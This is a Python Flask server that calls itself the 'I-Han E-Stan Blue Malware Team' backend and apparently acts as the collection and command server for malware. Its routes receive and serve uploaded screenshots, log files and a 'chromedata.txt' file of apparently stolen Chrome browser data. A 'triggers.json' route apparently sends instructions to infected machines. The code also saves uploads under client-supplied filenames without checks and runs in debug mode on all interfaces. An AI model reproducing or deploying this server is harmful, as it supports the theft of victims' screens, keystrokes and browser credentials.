from flask import Flask, request, send_file
import os

app = Flask(__name__)


def get_latest_image(path="images"):
    files = os.listdir(path)
    files.sort(key=lambda x: os.path.getmtime(os.path.join(path, x)))
    files.reverse()
    latest_file = files[0]
    return latest_file


@app.route("/show")
def show():
    if request.args.get("type") == "1":
        filename = "images/" + get_latest_image()
    else:
        filename = "images/" + get_latest_image()
    return send_file(filename, mimetype="image/gif")


@app.route("/showtxt")
def show_txt():
    filename = "logs/" + "logs.txt"
    return send_file(filename, mimetype="text/plain")


@app.route("/upload", methods=["POST"])
def upload():
    f = request.files["file"]
    f.save("images/" + (f.filename))
    return "file uploaded successfully"


@app.route("/uploadtxt", methods=["POST"])
def upload_txt():
    f = request.files["file"]
    f.save("logs/" + (f.filename))
    return "file uploaded successfully"


@app.route("/uploadchromedata", methods=["POST"])
def upload_chrome_data():
    f = request.files["file"]
    f.save("chromedata/" + ("chromedata.txt"))
    return "file uploaded successfully"


@app.route("/showchromedata")
def show_chrome_data():
    filename = "chromedata/" + "chromedata.txt"
    return send_file(filename, mimetype="text/plain")


#
#  !!!!!   Comment in kapatıldığı yere kadar olan yerlerin içi boş
#
#  !!!!!   Atılacak requestlerde patlayabiliriz


@app.route("/gettriggers")
def check_triggers():
    filename = "triggers.json"
    return send_file(filename, mimetype="json/plain")


#
#  !!!!!   Comment bitiş
#
#


@app.route("/")
def index():
    return "I-Han E-Stan Blue Malware Team"


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=3126, debug=True)
